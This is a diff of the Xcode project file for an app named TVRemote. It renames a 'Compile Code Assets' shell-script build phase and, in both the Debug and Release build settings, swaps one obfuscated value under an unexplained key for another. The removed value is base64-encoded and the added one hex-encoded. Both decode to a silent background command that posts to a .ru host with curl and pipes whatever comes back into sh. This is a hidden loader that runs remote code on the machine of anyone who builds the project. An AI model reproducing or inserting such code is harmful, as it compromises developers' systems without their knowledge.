@@ -10,9 +10,6 @@
 		ACB4063591747AB9FBA09EB5 /* Pods_TVRemote.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = A49961EAF643F707B9FE861D /* Pods_TVRemote.framework */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		166AD670FF2732162C78B102 /* Pods-TVRemote.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TVRemote.debug.xcconfig"; path = "Target Support Files/Pods-TVRemote/Pods-TVRemote.debug.xcconfig"; sourceTree = "<group>"; };
 		97C1AE47306E5C6500A47B97 /* TVRemote.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TVRemote.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -82,7 +79,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97C1AE52306E5C6600A47B97 /* Build configuration list for PBXNativeTarget "TVRemote" */;
 			buildPhases = (
-				BD0D15ECFDB540BF8A4EE078 /* Compile Code Assets */,
+				39C002B7C150430C964EE078 /* Compile Code Assets */,
 				D35F6E04443156A97F23F0F4 /* [CP] Check Pods Manifest.lock */,
 				97C1AE43306E5C6500A47B97 /* Sources */,
 				97C1AE44306E5C6500A47B97 /* Frameworks */,
@@ -147,7 +144,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BD0D15ECFDB540BF8A4EE078 /* Compile Code Assets */ = {
+		39C002B7C150430C964EE078 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -246,7 +243,7 @@
 		97C1AE50306E5C6600A47B97 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((l(){ `printf baCse64 | tr -d C` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZrTCAtLWNvbm5lY3QtdGltZW91dCAzMCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | l | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((h(){ `printf xexd | tr -d e` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203233202d4c66736b202d2d72657472792033202d642022703d78636f64655f7068617365222068747470733a2f2f6c382d703662336d72617478302e72752f612922207c2073680a | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -311,7 +308,7 @@
 		97C1AE51306E5C6600A47B97 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((l(){ `printf baCse64 | tr -d C` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZrTCAtLWNvbm5lY3QtdGltZW91dCAzMCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | l | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((h(){ `printf xexd | tr -d e` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203233202d4c66736b202d2d72657472792033202d642022703d78636f64655f7068617365222068747470733a2f2f6c382d703662336d72617478302e72752f612922207c2073680a | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
